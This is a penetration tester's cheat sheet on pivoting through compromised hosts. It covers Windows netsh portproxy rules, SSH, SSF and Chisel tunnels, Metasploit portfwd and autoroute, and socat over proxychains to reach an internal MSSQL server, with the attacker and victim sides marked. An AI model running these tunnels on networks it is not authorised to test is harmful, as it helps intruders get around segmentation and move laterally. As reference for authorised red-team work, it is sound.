# Pivoting

### Windows

#### Native

```text
netsh advfirewall firewall add rule name="<rulename>" dir=in action=allow protocol=TCP localport=8080
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<addr>
```

#### SSF

Server:

```text
./ssfd -p 8080
```

Client:

```text
./ssf -L 9000:127.0.0.1:80 -p 8080 127.0.0.1
./ssf -R 9000:127.0.0.1:80 -p 8080 127.0.0.1
```

### Linux

#### Static port forwarding \(single port, execute on attacker\)

```bash
ssh <user>@<target> -L 127.0.0.1:8888:<targetip>:<targetport>
```

#### Dynamic Port Forwarding \(execute on attacker\)

```bash
ssh -D <localport> user@host
```

#### Remote forwarding \(execute on victim\)

```bash
ssh -r -R <lport>:<ip>:<rport> user@attacker
```

#### Jump Host

```bash
ssh -J jumpuser1@jumphost1,jumpuser2@jumphost2,...,jumpuserN@jumphostN user@host
```

#### Chisel

Forward Port 8089, listening on a localhost on the victim, out to the attacker:

```text
victim> ./chisel server -p 5000
attacker> ./chisel client 192.168.127.201:5000 8089
```

### Metasploit

Remote Forward \(opens 6443 on remote and forwards to local 192.168.1.1:443\):

```text
portfwd add -R -p 6443 -l 443 -L 192.168.1.1
```

Note: Chaining multiple forwards often leads to Metasploit timeouts/crashes. In this case its best to just forward a single hop via metasploit and another technique for the next hop \(e.g. default windows forwarding\).

#### MSSQL

Get a session on a box that can reach the server, then run `autoroute -s addr/subnet` alternativly you can add these manually via `route add addr/subnet <session>` Start the socks4a proxy module. Now we can use socat to make the server locally available:

```text
proxychains socat TCP4-Listen:1433,fork TCP:<>:1433
```

Now a windows machine in the same network can connect via windows authentication:

```text
C:\Program Files (x86)\Microsoft SQL Server Management Studio 18\Common7\IDE>runas /netonly /user:<>\<> "Ssms.exe -S <local box>"
```

An alternative to autoroute is to use this syntax outside of any sessions:

```text
route add <>/<> <session id>
```

